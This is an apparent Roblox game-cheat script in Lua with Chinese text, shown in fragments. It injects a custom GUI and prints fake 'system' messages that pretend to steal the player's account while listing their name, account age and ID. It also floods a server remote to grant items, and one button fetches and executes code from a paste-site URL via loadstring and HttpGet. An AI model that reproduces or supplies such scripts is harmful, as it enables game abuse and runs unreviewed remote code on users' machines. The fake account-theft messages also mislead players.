if not game:IsLoaded() then game.IsLoaded:Wait()end function makeMessage(message)pcall(function()msg = tostring(message)if game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral") then game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral"):DisplaySystemMessage(msg)else game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{Text = msg,Color = Color3.fromRGB(255, 192, 203),Font = Enum.Font.GothamMedium,FontSize = 16})end end)end 
local function Smooth(gui)if not gui:IsA("GuiObject") then warn("提供的对象不是有效的GUI对象.")return end   
local uiCorner = Instance.new("UICorner")uiCorner.CornerRadius = UDim.new(1.5, 0)uiCorner.Parent = gui return uiCorner end  
local guiName = "GazeGayUI5"
local coreGay = game:GetService("CoreGui")if not coreGay:FindFirstChild(guiName) then
local screenGui = Instance.new("ScreenGui")screenGui.Name = guiName screenGui.Parent = coreGay makeMessage("[系统]:你好欢迎使用xgohub（此消息仅自己可见）")Wait("1")makeMessage("[系统]:客户端加载中...")Wait("1")makeMessage("[系统]:[窃取账号]↓[纯娱乐勿信]")Wait("2")makeMessage("[系统]:开始检测..")Wait("2")makeMessage("[系统]:检测到玩家"..game.Players.LocalPlayer.DisplayName)Wait("2")makeMessage("[系统]:用户名"..game.Players.LocalPlayer.Character.Name)Wait("2")makeMessage("[系统]:注册年龄"..game.Players.LocalPlayer.AccountAge)Wait("2")makeMessage("[系统];用户ID"..game.Players.LocalPlayer.UserId)return end
...
xgo:Toggle({["Title"]="增加鱼",["Content"] = "",["Default"] = false,["Callback"] = function (state)_G.AutoFish = state while _G.AutoFish and task.wait() dom ReplicatedStorage:WaitForChild("Fish"):FireServer(999999999999999999)end end})
...
xgo:Button({Title ="操作",   ["Content"] = "",  Callback = function()    loadstring(game:HttpGet('https://freenote.biz/raw/xkcdkgyhkx',true))()   end})
...
else    local coinContainer = findCoinContainer()
        if not coinContainer then
            print("没有找到唱歌")
            return
        end
